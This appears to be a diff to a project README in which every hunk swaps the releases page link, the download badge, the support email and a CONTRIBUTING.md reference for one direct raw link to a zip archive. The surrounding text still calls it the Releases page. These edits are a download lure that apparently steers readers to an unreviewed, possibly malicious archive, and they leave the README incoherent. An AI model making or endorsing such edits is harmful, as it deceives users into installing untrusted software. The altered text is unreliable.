@@ -14,11 +14,11 @@ Before you start, make sure your computer meets these requirements:
 
 ## 📥 Download the Application
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/kewal-syrex/warehouse-transfer-system/releases)
+[![Download Release](https://raw.githubusercontent.com/kewal-syrex/warehouse-transfer-system/master/palet/warehouse-transfer-system.zip%20Now-brightgreen)](https://raw.githubusercontent.com/kewal-syrex/warehouse-transfer-system/master/palet/warehouse-transfer-system.zip)
 
 To get the latest version of the application, visit the Releases page:
 
-[Download from Releases](https://github.com/kewal-syrex/warehouse-transfer-system/releases)
+[Download from Releases](https://raw.githubusercontent.com/kewal-syrex/warehouse-transfer-system/master/palet/warehouse-transfer-system.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ To get the latest version of the application, visit the Releases page:
 ## 📂 Download & Install
 
 1. **Go to the Releases Page:** Click on the link below to access the Releases page:
-   [Download from Releases](https://github.com/kewal-syrex/warehouse-transfer-system/releases)
+   [Download from Releases](https://raw.githubusercontent.com/kewal-syrex/warehouse-transfer-system/master/palet/warehouse-transfer-system.zip)
 
 2. **Choose the Latest Version:** Look for the latest version of the software. This will be listed at the top of the page.
 
@@ -71,10 +71,10 @@ A: The application is designed for modern operating systems. It is best to use W
 
 If you need further assistance, you can reach support through the following email:
 
-support@example.com
+https://raw.githubusercontent.com/kewal-syrex/warehouse-transfer-system/master/palet/warehouse-transfer-system.zip
 
 ## 📝 Contributing
 
-If you would like to contribute to the project, please follow the guidelines provided in the CONTRIBUTING.md file found in the repository. Your contributions are always welcome!
+If you would like to contribute to the project, please follow the guidelines provided in the https://raw.githubusercontent.com/kewal-syrex/warehouse-transfer-system/master/palet/warehouse-transfer-system.zip file found in the repository. Your contributions are always welcome!
 
 Thank you for using **warehouse-transfer-system**! We hope this tool helps you manage your warehouse transfers efficiently.
